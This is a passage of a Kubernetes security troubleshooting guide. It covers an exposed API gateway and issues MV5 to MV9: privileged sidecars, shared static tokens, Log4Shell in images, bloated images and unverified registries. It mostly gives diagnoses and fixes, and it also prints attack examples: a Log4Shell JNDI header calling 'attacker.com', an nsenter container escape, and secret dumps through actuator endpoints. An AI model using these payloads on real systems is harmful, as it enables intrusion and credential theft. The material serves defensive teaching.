🔍 Symptom: The API Gateway (nginx-ingress/Ambassador/Traefik) is configured to route /internal/*, /admin/*, and /actuator/* directly to backend services WITHOUT authentication. curl https://anihpj.jobpost.com/internal/status returns internal service health, database connection strings, and memory metrics. The API gateway is acting as a transparent proxy, exposing every internal endpoint to the public internet. Attackers can enumerate internal APIs, discover unauthenticated admin panels, and access Spring Boot actuator endpoints with environment variable dumps.

  curl https://anihpj.jobpost.com/internal/status
  {"status":"ok","db":"postgresql://anihpj-db:5432/jobpost","redis":"redis:6379"}

  curl https://anihpj.jobpost.com/admin/login
  <html>... Django admin login page ...</html>   ← ADMIN PANEL EXPOSED!

  curl https://anihpj.jobpost.com/actuator/env
  {"properties":{"POSTGRES_PASSWORD":"****","AWS_SECRET_KEY":"****"}}   ← ENV LEAK!
🔴5 Most Likely Causes
  1. Catch-all route in Ingress/Gateway configuration: spec.rules[].http.paths[].path: /* or / routes ALL paths to the backend service. Internal endpoints like /admin, /actuator, /internal are exposed because there's no path filtering.
  2. No authentication middleware on the gateway: The API gateway forwards requests directly to backends without requiring authentication for administrative paths. Anyone can access /admin without a valid JWT or API key.
  3. Spring Boot Actuator endpoints enabled in production: management.endpoints.web.exposure.include=* exposes ALL actuator endpoints including /env, /heapdump, /threaddump, and /mappings. These leak environment variables, heap memory, and internal API routes.
  4. Django DEBUG mode enabled in production: DEBUG=True in Django exposes detailed error pages with stack traces, local variables, and settings — including SECRET_KEY and database credentials — on any unhandled exception.
  5. No WAF or path-based blocking at the gateway: The gateway doesn't block known dangerous paths: /admin, /actuator, /swagger-ui.html, /graphql, /.env, /phpmyadmin. Attackers use automated scanners to discover these endpoints.
🟡5 Less Likely Causes
  1. Service mesh route exposes internal-only paths: Istio VirtualService has a route for /admin that should only be accessible from internal mesh traffic, but it's bound to the public Gateway — exposing it externally.
  2. Reverse proxy misconfiguration: nginx proxy_pass http://backend/; without location block restrictions forwards ALL URIs including /internal paths that should be blocked.
  3. Kubernetes Service type LoadBalancer for internal service: The anihpj-api Service has type: LoadBalancer — exposing it DIRECTLY to the internet with a public IP, bypassing the API gateway entirely.
  4. Path traversal via URL encoding: Attackers use /admin%2F or /internal/../admin/ to bypass path-based routing rules. The gateway normalizes paths inconsistently.
  5. Gateway forwards to wrong service on miss: defaultBackend or catch-all rule forwards unmatched requests to an internal service that exposes debugging information. Any unknown path reveals internal details.
🟣5 New Cluster Causes
  1. Ingress/Gateway configured with broad routing for simplicity: During initial setup, the team used path: / to "make everything work." Internal paths were never restricted later.
  2. No API security review or gateway audit: No one has ever reviewed what endpoints are exposed through the gateway. kubectl describe ingress -A has never been done for security purposes.
  3. Actuator/Swagger/GraphQL included by default dependency: Spring Boot includes actuator by default. Django REST Framework includes browsable API. These dev tools are never disabled for production.
  4. No WAF deployed in front of the cluster: No cloud WAF (AWS WAF, Cloud Armor) or cluster-level WAF (ModSecurity with nginx-ingress) to block common attack paths and scanner probes.
  5. No external penetration testing: Automated vulnerability scanners would immediately flag exposed admin panels and actuator endpoints. No pen test has been performed.
🔍 What to Look At:
kubectl get ingress,httproute -A -o yaml | grep -E "path:|prefix:|host:" Review all routing rules. A prefix: / or path: /* without specific path restrictions exposes all backend paths.
curl -s https://anihpj.jobpost.com/admin/ -o /dev/null -w "%{http_code}" If it returns 200 or 302 (instead of 404/403), the admin panel is publicly accessible. Test /actuator, /swagger-ui.html, and /graphql too.
kubectl exec anihpj-api -- env | grep -i "debug\|actuator\|swagger" Check if DEBUG mode or dev tools are enabled inside the container. They should ALWAYS be disabled in production.
🎯 #1 Root Cause: The API Gateway uses catch-all routing (path: / or prefix: /) that forwards ALL paths to backend services. Combined with dev tools (Django DEBUG, Spring Boot Actuator) left enabled in production, internal endpoints, admin panels, and environment variable dumps are exposed to the public internet.
🔧 How to Solve:
1. Restrict gateway routes to specific API paths only Replace prefix: / with explicit paths like prefix: /api/ and prefix: /health/. Block everything else: /admin, /internal, /actuator, /swagger, /graphql.
2. Add authentication middleware on the gateway Require valid JWT for ALL paths except /health and /api/auth/login. The gateway validates JWTs before forwarding to backends — unauthenticated requests are rejected at the edge.
3. Disable DEBUG and dev tools in production DEBUG=False in Django settings. management.endpoints.web.exposure.include=health,info in Spring Boot. Never expose /env, /heapdump, or /mappings.
4. Deploy a WAF to block common attack paths ModSecurity with nginx-ingress or cloud WAF (AWS WAF/Cloud Armor). Block requests to: /admin, /actuator, /.env, /wp-admin, /phpmyadmin — common scanner targets.
5. Use internal-only Services for admin endpoints Keep admin panels on ClusterIP Services with NO Ingress. Access them via kubectl port-forward or a VPN-accessible internal load balancer — never expose to the public internet.
💡 Personal Advice:
Your API gateway should be a firewall, not a transparent proxy. Explicitly define which paths are exposed. Block everything else. Every internal endpoint, admin panel, and debug tool that's reachable through the gateway is a potential compromise vector. Path allowlisting is your first line of defense.
Dev tools in production = incident waiting to happen. Django DEBUG, Spring Boot Actuator, Swagger UI, and GraphQL Playground have NO place in production. They leak environment variables, database schemas, API routes, and sometimes credentials. Disable them in your production config — and verify with a curl check.

📌 MV5–MV8: Sidecar Permissions, Shared Tokens, CVEs & Distroless Images

MV5
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV5
Sidecar Proxy with Excessive Permissions — NET_ADMIN + Privileged

🔍 Symptom: The Istio sidecar (istio-proxy) runs with CAP_NET_ADMIN and additional elevated privileges. While NET_ADMIN is required for iptables-based traffic interception, the sidecar in this cluster also has privileged: true and mounts /proc from the host. If an attacker compromises the Envoy proxy (via a known CVE in the proxy code, e.g., CVE-2023-27487), they gain FULL node access through the over-privileged sidecar — the very component meant to secure the pod becomes the attack vector.

  kubectl get pod anihpj-web -n anihpj -o yaml | grep -A20 "istio-proxy" | grep -E "privileged|capabilities|procMount"
  privileged: true
  capabilities: {add: [NET_ADMIN, NET_RAW, SYS_ADMIN]}   ← EXCESSIVE!
  procMount: Default   ← Should be Unmasked for sidecar, but check!

  kubectl exec anihpj-web -c istio-proxy -- nsenter --mount --target 1 -- bash
  root@node-anih:~#   ← SIDECAR COMPROMISE = NODE COMPROMISE!
🔴5 Most Likely Causes
  1. Istio installed with legacy privileged injection: Older Istio installations used privileged: true for the sidecar init container. The installation manifests were never updated to use the Istio CNI plugin (which eliminates the need for privileged init containers).
  2. CAP_SYS_ADMIN added to sidecar unnecessarily: The sidecar has CAP_SYS_ADMIN — the most dangerous capability. This may have been added to "fix" a networking issue but enables mount namespace manipulation and container escape.
  3. Sidecar runs as root (UID 0) without user namespace: The istio-proxy runs as UID 0. If exploited, the attacker is root inside the container with NET_ADMIN — they can reconfigure iptables, redirect traffic, and escape via kernel exploits.
  4. No resource limits on sidecar: The sidecar has no CPU/memory limits. A compromised sidecar can consume all node resources (crypto mining, DoS), impacting all pods on the node — including the application container it's supposed to protect.
  5. Sidecar version outdated with known CVEs: The istio-proxy image is 18 months old and has multiple critical CVEs (e.g., Envoy proxy vulnerabilities). The outdated sidecar is the easiest attack vector into the pod.
🟡5 Less Likely Causes
  1. Sidecar shares the pod's writable emptyDir volume: The sidecar can write to the same /tmp as the application container. A compromised sidecar can plant malicious files that the app container reads and executes.
  2. Sidecar has hostPath mount to Docker socket: /var/run/docker.sock is mounted into the sidecar — allowing the sidecar to launch privileged containers on the host. This is sometimes done for "logging" or "monitoring" plugins.
  3. No seccomp or AppArmor profile for sidecar: The sidecar runs Unconfined — all 300+ syscalls are available. NET_ADMIN is needed, but seccomp can restrict other dangerous syscalls like mount and kexec.
  4. Sidecar has access to application Secret volumes: The sidecar mounts the same Secret volumes as the app container via shared /etc/certs. A compromised sidecar can read TLS private keys and JWT signing keys.
  5. Custom sidecar annotations override security defaults: sidecar.istio.io/userVolume or traffic.sidecar.istio.io/includeInboundPorts annotations add excessive mounts or expose unnecessary ports.
🟣5 New Cluster Causes
  1. Istio installed with default manifests from getting-started: The quick-start Istio installation uses privileged init containers and broad capabilities. Production hardening was never applied.
  2. Istio CNI plugin not installed: Istio CNI eliminates the need for privileged init containers and NET_ADMIN in the sidecar. It's an optional install that teams skip for simplicity.
  3. No sidecar security baseline in mesh configuration: No Istio MeshConfig or Sidecar resource restricting sidecar capabilities, resource limits, or seccomp profiles.
  4. Sidecar treated as "infrastructure" — exempt from security review: The security team focuses on application containers. Sidecars are invisible in their threat model — despite running with elevated privileges on every pod.
  5. No sidecar CVE monitoring or upgrade policy: Sidecar images are not scanned for CVEs. No policy for updating istio-proxy images within X days of a critical Envoy CVE disclosure.
🔍 What to Look At:
kubectl get pods -n anihpj -o yaml | grep -A30 "istio-proxy" | grep -E "privileged|capabilities|seccompProfile|runAsUser" Audit the sidecar's securityContext. Look for privileged: true, capabilities.add beyond NET_ADMIN, and missing readOnlyRootFilesystem.
istioctl proxy-status Check sidecar sync status and proxy version. Outdated proxies (Envoy version behind istiod version) indicate missing updates.
kubectl get pods -n istio-system -o jsonpath='{.items[0].spec.containers[0].image}' Check istiod version. Compare against latest Istio release with security patches.
🎯 #1 Root Cause: The Istio sidecar runs with privileged: true and excessive Linux capabilities beyond the required NET_ADMIN. Combined with running as root (UID 0) and missing seccomp profile, a compromised sidecar proxy becomes a direct path to node compromise.
🔧 How to Solve:
1. Install Istio CNI plugin to eliminate privileged requirements Istio CNI configures pod networking without requiring NET_ADMIN or privileged init containers. Sidecar runs with minimal capabilities — NET_BIND_SERVICE only.
2. Apply restrictive securityContext to sidecar via mesh config Configure MeshConfig.defaultConfig with readOnlyRootFilesystem: true, runAsNonRoot: true, allowPrivilegeEscalation: false, and capabilities.drop: [ALL] for sidecars.
3. Set resource limits on sidecar kubectl annotate ns anihpj sidecar.istio.io/proxyCPULimit=500m sidecar.istio.io/proxyMemoryLimit=256Mi Prevent a compromised sidecar from consuming all node resources via crypto mining or memory exhaustion.
4. Upgrade Istio to latest patched version istioctl upgrade Ensure all sidecars run the latest Envoy proxy with security patches. Set up regular upgrade cycles.
5. Add sidecar to vulnerability scanning pipeline Scan istio/proxyv2 images alongside application images. Alert on critical CVEs in sidecar images within 24 hours of disclosure.
💡 Personal Advice:
Your sidecar is a privileged process running next to every app. The sidecar has NET_ADMIN — it can intercept, redirect, or DROP all your pod's traffic. Treat it with the same security scrutiny as your application. Harden it or it becomes the weakest link.
Istio CNI is the secure alternative to privileged init. The Istio CNI plugin eliminates the need for NET_ADMIN capability and privileged init containers entirely. It's a one-time install on each node and removes the most dangerous sidecar permissions. Use it in production.
MV6
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV6
Inter-Service Auth Using Shared Static Token — No Per-Service Identity

🔍 Symptom: All microservices share a SINGLE static API key stored in a ConfigMap: API_KEY: "anihpj-shared-secret-2024". Every service — anihpj-web, anihpj-api, anihpj-db-proxy — uses the same token to authenticate to each other. If ANY service is compromised, the attacker extracts the shared key and can impersonate EVERY service. There's no per-service identity — the API can't distinguish between a legitimate request from anihpj-web and a malicious request from a compromised anihpj-redis pod using the same key.

  kubectl get cm anihpj-shared-config -n anihpj -o yaml
  data:
    API_KEY: anihpj-shared-secret-2024   ← SAME KEY FOR ALL SERVICES!

  kubectl exec anihpj-redis -n anihpj -- curl -H "X-API-Key: anihpj-shared-secret-2024" https://anihpj-api:8000/api/users
  {"users": [...]}   ← REDIS POD CALLING API WITH SAME KEY!
🔴5 Most Likely Causes
  1. Single static API key shared across all services: A ConfigMap or Secret contains one API key that every service uses. There's no per-service identity — the API server sees all internal requests as coming from the same "internal-services" principal.
  2. No SPIFFE/SPIRE or service mesh identity: Without a service mesh (Istio/Linkerd) or SPIFFE, there's no cryptographic workload identity. Each pod would need its own X.509 SVID certificate — but none are configured.
  3. API key in ConfigMap readable by all pods: ConfigMaps are readable by any pod in the namespace with default RBAC. A compromised redis pod can kubectl get cm and extract the shared API key — then impersonate the web or api service.
  4. No service-to-service authentication middleware: The API server checks "is the API key valid?" but not "does this caller have permission to call this endpoint?" Every service with the key can call EVERY endpoint — no scope or audience restriction.
  5. API key never rotated: The shared key was created during initial setup and never changed. Every former employee, every CI pipeline, and every log file that ever captured the key can still use it.
🟡5 Less Likely Causes
  1. API key passed as query parameter in logs: GET /api/jobs?api_key=anihpj-shared-secret-2024 — the key appears in every access log, every load balancer log, and every monitoring tool that captures HTTP requests.
  2. mTLS configured but auth falls back to API key: mTLS is enabled but the application also accepts the shared API key for "compatibility." Attackers can use the weaker API key auth instead of mTLS.
  3. API key committed to infrastructure Git repo: The key is in a config.yaml or Helm values file committed to Git. Every developer with repo access, and anyone who clones the repo, has the shared key.
  4. No rate limiting per API key: A compromised service can make unlimited API calls with the shared key. The API server can't throttle because all requests look identical.
  5. Shared key used for both internal and external auth: The SAME key is used for external client authentication AND internal service-to-service communication. If a client's key leaks, all internal services are compromised.
🟣5 New Cluster Causes
  1. Service mesh not deployed: Without Istio/Linkerd, per-service identity requires manual certificate management. Teams use a shared key as the "easy" alternative.
  2. API key generated at project inception and never reconsidered: The "temporary" shared key for early development became the permanent production authentication mechanism.
  3. No inter-service auth strategy defined: No architecture decision on how services should authenticate to each other. Shared key was the path of least resistance.
  4. Monolith-to-microservice migration with legacy auth: The original monolith used a single API key. After decomposition into microservices, the key was copied to every service without redesigning authentication.
  5. No security review of inter-service communication: External API security was reviewed (OAuth, JWT). Internal service-to-service communication was never assessed.
🔍 What to Look At:
kubectl get cm,secrets -n anihpj -o yaml | grep -i "api.key\|shared.secret\|service.token" Search for shared credentials. Any ConfigMap or Secret containing a single key used by multiple services is a shared-auth vulnerability.
kubectl exec anihpj-redis -- curl -H "Authorization: Bearer <KEY>" anihpj-api:8000/api/users Test if a service that SHOULDN'T access the API can do so with the shared key. If it works, there's no per-service identity enforcement.
istioctl authn tls-check anihpj-web anihpj-api If Istio is installed, check if mTLS is active between specific services. This is the secure alternative to shared API keys.
🎯 #1 Root Cause: A single static API key is shared across all microservices. There is no per-service cryptographic identity — every pod that knows the shared key can impersonate any other service, making it impossible to isolate a compromise or enforce least-privilege service-to-service access.
🔧 How to Solve:
1. Deploy service mesh with SPIFFE-based per-pod identity Istio/Linkerd issues each pod an X.509 SVID certificate. Every service has a unique cryptographic identity. Auth policies can now restrict which services call which endpoints.
2. Enforce per-service authorization policies kubectl apply -f - <<EOF apiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: {name: api-access, namespace: anihpj} spec: selector: {matchLabels: {app: anihpj-api}} rules: - from: [{source: {principals: ["cluster.local/ns/anihpj/sa/anihpj-web"]}}] to: [{operation: {paths: ["/api/jobs"]}}] EOF Only the anihpj-web ServiceAccount can access the /api/jobs endpoint on anihpj-api. Redis, db, and any compromised pod are blocked.
3. Delete the shared API key from ConfigMaps kubectl delete cm anihpj-shared-config -n anihpj Remove the shared key entirely. Rotate any keys that may have been exposed. Generate per-service keys if mTLS is not yet available.
4. Issue per-service JWTs with audience restriction Each service gets its own JWT signed with its ServiceAccount. The JWT aud claim specifies which service it's intended for. The API validates both the signature AND the audience.
5. Audit Git history for exposed keys Run trufflehog or git-secrets on the entire repository history. Rotate ANY key found in any commit, even old ones.
💡 Personal Advice:
A shared API key means every compromise is a cluster-wide compromise. If your redis pod is exploited, the attacker gets the API key — and can now call any internal API as any service. Per-service identity (mTLS/SPIFFE) means compromising redis only gives you redis permissions — not the entire backend.
mTLS solves this out of the box. With a service mesh, every pod gets its own identity certificate. AuthorizationPolicy can restrict which identities can call which paths. This is microservice security 101 — and it requires zero code changes with Istio/Linkerd.
MV7
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV7
Container Image with Critical CVE — Log4Shell in Running Pod

🔍 Symptom: trivy image anihpj/jobpost-api:v1.2 reports CRITICAL: CVE-2021-44228 (Log4Shell) — the image contains a vulnerable Log4j library. The anihpj-api pod has been running with this vulnerability for 18 months. A single crafted HTTP header (X-Api-Version: ${jndi:ldap://attacker.com/a}) triggers a remote code execution via JNDI lookup. The attacker gets a reverse shell INSIDE the container — and from there can access the Kubernetes API via the mounted ServiceAccount token.

  trivy image anihpj/jobpost-api:v1.2
  anihpj/jobpost-api:v1.2 (debian 11.6)
  Total: 47 (CRITICAL: 3, HIGH: 15, MEDIUM: 22, LOW: 7)
  ┌─────────────────────┬────────────────┬──────────┬───────────────────┐
  │ CVE-2021-44228      │ CRITICAL       │ log4j    │ Remote Code Exec  │
  │ CVE-2022-22965      │ CRITICAL       │ spring   │ Spring4Shell RCE  │

  curl -H "X-Api-Version: \${jndi:ldap://attacker.com/evil}" https://anihpj-api:8000/
  # Attacker's LDAP server receives connection — RCE successful!
🔴5 Most Likely Causes
  1. No image vulnerability scanning in CI/CD pipeline: Images are built and pushed to the registry without being scanned. Critical CVEs go undetected for months. A trivy image or grype scan step in CI would have caught Log4Shell before deployment.
  2. Image built 18 months ago and never rebuilt: The anihpj-api:v1.2 image hasn't been rebuilt since the initial release. All CVE patches released since then are missing. The image contains every vulnerability discovered in the last 18 months.
  3. Base image is outdated and unmaintained: FROM python:3.9 (not python:3.9-slim) uses a full Debian base with hundreds of unnecessary packages — each with its own CVEs. A slim or distroless base image would have 80% fewer CVEs.
  4. No runtime vulnerability detection: Falco or similar runtime security tool is not deployed. Even with vulnerable images running, a Falco rule could detect the JNDI outbound connection or the reverse shell spawned by Log4Shell.
  5. No vulnerability management process: There's no SLA for patching critical CVEs. The team has no process for triaging vulnerability reports, rebuilding images, and rolling out patches.
🟡5 Less Likely Causes
  1. Dependency pinned to vulnerable version: requirements.txt has log4j==2.14.1 pinned. Pip installs the vulnerable version every build. The pin was never updated because "it works."
  2. Vulnerability scanner not scanning ALL images: Only the :latest tag is scanned. Versioned tags (:v1.2) deployed to production are not in the scanning scope — vulnerability reports show latest as clean while v1.2 has critical CVEs.
  3. Image uses packages from OS package manager: apt-get install openjdk-11-jre in the Dockerfile installs a JRE with bundled Log4j. OS packages are not tracked by language-specific vulnerability scanners — the Log4j CVE goes undetected.
  4. False sense of security from NetworkPolicy: The team thinks "the pod can't reach the internet" means Log4Shell can't phone home. But Log4Shell can exploit via DNS (JNDI DNS lookup) which may be allowed through egress rules.
  5. Scanner threshold set too high: Trivy is configured to fail only on CRITICAL severity. HIGH and MEDIUM CVEs are reported but not blocking. Some critical vulnerabilities are misclassified as HIGH by the scanner.
🟣5 New Cluster Causes
  1. Image scanning not set up in CI pipeline: Trivy/Grype/Snyk not integrated. Images go to production without any vulnerability assessment.
  2. Registry allows push without scan pass: The container registry (ECR, GCR, Harbor) doesn't enforce a scan-before-push policy. Vulnerable images are accepted.
  3. No runtime admission control for vulnerable images: No OPA/Kyverno policy that checks image scan results and blocks deployment of images with critical CVEs.
  4. Images manually built and pushed: No automated CI/CD pipeline ensures every build is scanned. Manual builds skip the scanning step entirely.
  5. Old images not periodically rescanned: New CVEs are discovered daily. An image that was clean 6 months ago may now have critical CVEs — but rescans are not performed on already-deployed images.
🔍 What to Look At:
trivy image anihpj/jobpost-api:v1.2 --severity CRITICAL,HIGH Scan the exact image tag deployed in production. Focus on CRITICAL and HIGH — these are the ones that need immediate remediation.
kubectl get pods -n anihpj -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}' List all container images running in the namespace. Every one of them should be within the vulnerability SLA window.
docker history anihpj/jobpost-api:v1.2 --no-trunc | head -5 Check the base image and age layers. Year-old layers indicate an image that hasn't been rebuilt with security patches.
🎯 #1 Root Cause: No image vulnerability scanning is integrated into the CI/CD pipeline. Container images are built, pushed, and deployed without any CVE assessment. Critical vulnerabilities like Log4Shell (CVE-2021-44228) remain in running containers for months, providing attackers with well-documented RCE vectors.
🔧 How to Solve:
1. Add image scanning to CI pipeline trivy image --severity CRITICAL,HIGH --exit-code 1 anihpj/jobpost-api:latest Fail the build if CRITICAL or HIGH CVEs are found. This prevents vulnerable images from ever reaching the registry.
2. Rebuild images regularly (weekly at minimum) Schedule a weekly rebuild of all base images with --pull to get the latest security patches. Even if application code hasn't changed, the base layers have been patched.
3. Use minimal base images Switch from python:3.9 to python:3.9-slim or distroless. 80%+ fewer packages means 80%+ fewer CVEs. The attack surface shrinks dramatically.
4. Deploy admission controller blocking vulnerable images Kyverno/OPA policy: check image scan results from the registry. Block deployment if image has CRITICAL CVEs with known fixes. Allow with warning for MEDIUM.
5. Rescan all running images weekly Deploy a cronjob that runs trivy image on all images currently running in the cluster. Alert on any newly discovered CRITICAL CVEs in running pods.
💡 Personal Advice:
Log4Shell was discovered in 2021. If it's still in your images in 2026, you need a process change. A known-exploitable critical CVE should NEVER be in a running container. Image scanning + regular rebuilds make this impossible. If you're not scanning, you're running vulnerable code RIGHT NOW — you just don't know it yet.
Scan at EVERY stage: build, registry, admission, runtime. Build-time scanning catches CVEs before push. Registry scanning catches CVEs discovered after build. Admission control blocks deployment. Runtime scanning catches newly-disclosed CVEs in running pods. Four layers. Zero blind spots.
MV8
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV8
Distroless Image Not Used — Unnecessary Tools in Production Container

🔍 Symptom: kubectl exec anihpj-api -- apt list --installed | wc -l returns 347 — the production container has 347 installed packages including curl, wget, nc, python3-pip, gcc, make, and git. An attacker who gets a shell inside the container has a FULL DEVELOPMENT ENVIRONMENT — they can download tools, compile exploits, and establish persistence. The image is based on python:3.9 (full Debian) instead of python:3.9-slim (minimal Debian) or gcr.io/distroless/python3 (no shell, no package manager).

  kubectl exec anihpj-api -n anihpj -- apt list --installed 2>/dev/null | wc -l
  347   ← 347 PACKAGES IN A PRODUCTION CONTAINER!

  kubectl exec anihpj-api -n anihpj -- which curl wget nc gcc git ssh
  /usr/bin/curl
  /usr/bin/wget
  /usr/bin/nc
  /usr/bin/gcc        ← FULL COMPILER IN PRODUCTION!
🔴5 Most Likely Causes
  1. Full base image used instead of slim/distroless: FROM python:3.9 pulls a FULL Debian image with 347 packages. FROM python:3.9-slim has ~50 packages. FROM gcr.io/distroless/python3 has ZERO unnecessary packages and NO shell.
  2. Build tools left in the final image: The Dockerfile uses multi-stage build but copies build artifacts from the builder stage WITHOUT isolating them. COPY --from=builder /app also copies gcc and make if they're in the same directory.
  3. apt-get install in Dockerfile without cleanup: RUN apt-get update && apt-get install -y curl wget vim — packages are installed and NEVER removed. The layer permanently includes these tools. Use apt-get clean && rm -rf /var/lib/apt/lists/* after install.
  4. Shell required for application entrypoint or debugging: The team uses kubectl exec -it <pod> -- /bin/bash for debugging. They keep bash in the image "just in case." This convenience gives attackers a full interactive shell after compromise.
  5. No security review of Dockerfile: The Dockerfile was written by a developer focused on "does it work?" — not "what's the minimal set of things this container needs?" No security team has reviewed the image content.
🟡5 Less Likely Causes
  1. Image includes systemd or init system: The container runs an init system (systemd, supervisord) that spawns multiple processes and requires a full OS environment. This is an anti-pattern for containers.
  2. Python dependencies require build tools at runtime: Some pip packages compile C extensions at install time. If pip install happens at container STARTUP (not build time), gcc must be present. Move pip install to the Dockerfile build stage.
  3. Cron jobs require shell and utilities: The container runs scheduled tasks via cron or celery beat that execute shell scripts. These scripts use curl and other tools that could be replaced with Python-native alternatives.
  4. No Docker Slim or similar minimization: Tools like docker-slim or dive can analyze and minimize images by removing unused files and libraries. These are not part of the build pipeline.
  5. Legacy migration from VM to container: The application was migrated from a VM where "install everything" was the norm. The Dockerfile replicates the VM environment — including all the unnecessary tools.
🟣5 New Cluster Causes
  1. No image size or package count policy: No organizational standard for maximum image size or allowed packages. Images grow unbounded.
  2. Distroless images unknown to the team: Developers are unaware that distroless base images exist or that containers don't need a shell, package manager, or OS tools.
  3. Dockerfile copied from public Docker Hub examples: Public examples use full base images for simplicity. Teams copy-paste without adapting for production security requirements.
  4. No image analysis in CI/CD: No dive or docker-slim analysis in CI to measure image efficiency and flag unnecessary packages or layers.
  5. "Bigger image = easier debugging" culture: The ops team believes production containers need debugging tools. This anti-pattern is accepted because "we've always done it this way."
🔍 What to Look At:
kubectl exec <pod> -- which sh bash curl wget nc telnet gcc make git 2>/dev/null Check which tools are available inside the container. Each one is a tool the attacker can use for lateral movement, exfiltration, and persistence.
docker history anihpj/jobpost-api:v1.2 --format "table {{.CreatedBy}}\t{{.Size}}" | head -20 Review Dockerfile layers. Look for apt-get install layers — each one adds unnecessary packages to the attack surface.
kubectl exec <pod> -- ls -la /bin /usr/bin /sbin | wc -l Count executables. A slim Python container should have ~50 executables. 300+ indicates a full OS image.
🎯 #1 Root Cause: The production container uses a full Debian base image (python:3.9) containing 347 packages including curl, wget, gcc, git, and bash. An attacker who compromises the application has a complete development environment for tool download, exploit compilation, and persistent access.
🔧 How to Solve:
1. Switch to a distroless or slim base image FROM gcr.io/distroless/python3-debian12 Distroless images contain ONLY the application and its runtime dependencies. No shell, no package manager, no curl, no gcc. Attackers can't download tools or spawn interactive shells.
2. Use multi-stage builds to isolate build tools FROM python:3.9 AS builder # ... pip install ... FROM gcr.io/distroless/python3-debian12 COPY --from=builder /app /app The builder stage has all build tools. The final stage has ONLY the application. Build tools never appear in the production image.
3. Remove package manager caches in Dockerfile RUN apt-get update && apt-get install -y --no-install-recommends <pkg> && rm -rf /var/lib/apt/lists/* If you must install packages, use --no-install-recommends to skip optional dependencies and clean the cache to reduce layer size.
4. Use readOnlyRootFilesystem with distroless Distroless + readOnlyRootFilesystem: true = the attacker can't write files OR execute tools. The container is a pure runtime for the application — nothing else.
5. Debug with ephemeral containers, not installed tools kubectl debug -it <pod> --image=busybox --target=<container> Use kubectl debug to attach a temporary debugging container. Don't install debugging tools in the production image.
💡 Personal Advice:
Every tool in your container is an attacker's tool. curl? Data exfiltration. nc? Reverse shell. gcc? Compile exploits. bash? Interactive persistence. If your production container has these, you're giving attackers a pre-installed toolbelt. Use distroless — if there's no shell, they can't even get in.
Distroless + readOnlyRootFilesystem = digital fortress. A distroless container with a read-only filesystem is the gold standard for production security. No package manager to install tools. No writable directories to drop malware. No shell to execute commands. The container does ONE thing — run your app.

📌 MV9–MV12: Registry Trust, Hardcoded Secrets, Debug Endpoints & CORS

MV9
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV9
Image Pulled from Public Registry Without Verification — Supply Chain Risk

🔍 Symptom: kubectl get pods -n anihpj -o yaml | grep image: shows images being pulled from docker.io/anihpj/jobpost-api:v1.2 and docker.io/library/python:3.9. There's NO image digest pinning, NO signature verification (Cosign/Notary), and NO private registry. Anyone who pushes to docker.io/anihpj/jobpost-api can replace the :v1.2 tag — and the cluster will pull and run that image on the next restart. A compromised Docker Hub account or a typosquatted image means arbitrary code execution in your cluster.

  kubectl get pods -n anihpj -o yaml | grep "image:"
  image: docker.io/anihpj/jobpost-api:v1.2   ← MUTABLE TAG!
  image: docker.io/library/python:3.9         ← PUBLIC REGISTRY!

  cosign verify anihpj/jobpost-api:v1.2
  Error: no signatures found   ← IMAGE NOT SIGNED!
🔴5 Most Likely Causes
  1. Floating tag (:latest or :v1.2) instead of digest: Tags are MUTABLE — anyone with push access can change what :v1.2 points to. Use SHA256 digest: image: anihpj/jobpost-api@sha256:abc123.... The digest is immutable — the image cannot be replaced.
  2. Images pulled from public Docker Hub without validation: Docker Hub is a public registry — any image can be uploaded. Typosquatting (anihpj vs anihpj) or account takeover makes the public registry a supply chain risk.
  3. No image signature verification (Cosign/Notary): Images are not signed. There's no cryptographic proof that the image was built by the authorized CI pipeline. An attacker with registry access can push a malicious image and the cluster trusts it implicitly.
  4. No private registry with access control: A private registry (Harbor, ECR, GCR) with IAM-based push/pull access ensures only authorized identities can publish images. Public Docker Hub relies on username/password — easily phished or leaked.
  5. imagePullPolicy: Always with mutable tags: The pod has imagePullPolicy: Always. On every restart, the kubelet pulls the latest version of the tag — even if the image was replaced with a malicious version since the last pull.
🟡5 Less Likely Causes
  1. Registry credentials in plaintext imagePullSecrets: Docker Hub credentials are stored in a Kubernetes Secret of type kubernetes.io/dockerconfigjson. If the Secret is leaked, anyone can push images to the registry under the organization's name.
  2. No registry vulnerability scanning: The registry doesn't scan images for CVEs on push. A malicious image with a backdoor could pass through without any security check.
  3. Public base images pulled without pinning: FROM python:3.9 is a mutable tag on Docker Hub. The base image can change between builds — introducing unpredictable behavior and potential compromise.
  4. Image built on developer laptop and pushed directly: No CI/CD pipeline. Developers build and push images manually. There's no audit trail of who built what and when — a compromised developer laptop means compromised production images.
  5. No Software Bill of Materials (SBOM): Without an SBOM, you can't verify what packages are in your image. A malicious dependency added to the build is invisible without SBOM diffing between builds.
🟣5 New Cluster Causes
  1. Private registry not deployed: New cluster relies on Docker Hub or public ECR/GCR galleries. No Harbor or private ECR repository for internal images.
  2. Cosign/Notary not integrated into CI pipeline: Image signing is not part of the build process. Images are pushed unsigned — the cluster has no way to verify authenticity.
  3. No admission controller verifying image signatures: Kyverno/OPA can verify Cosign signatures at admission time. Without it, unsigned images are deployed without warning.
  4. Image digests not used in deployment manifests: All GitOps/IaC manifests use tags (:v1.2) instead of digests. The deployed image can change without a Git commit.
  5. No image provenance or SLSA compliance: No SLSA provenance attestations proving the image was built by the authorized CI pipeline. The supply chain has no verifiable integrity.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, image: .spec.containers[].image}' Check if images use tags or digests. If you see :v1.2 or :latest without @sha256:, the image is mutable and replaceable.
cosign verify --key cosign.pub anihpj/jobpost-api:v1.2 Verify the image signature. If no signature exists, the image's authenticity cannot be verified — it could have been pushed by anyone.
kubectl get pods -n anihpj -o json | jq '.items[].spec.containers[].imagePullPolicy' Always means the kubelet re-pulls on every restart — exposing you to tag mutation attacks. IfNotPresent is safer with digests.
🎯 #1 Root Cause: Images use mutable tags (:v1.2) instead of immutable digests (@sha256:abc...) and are not cryptographically signed. Any actor with registry push access can replace the tagged image — the cluster will pull and run the malicious image on the next pod restart.
🔧 How to Solve:
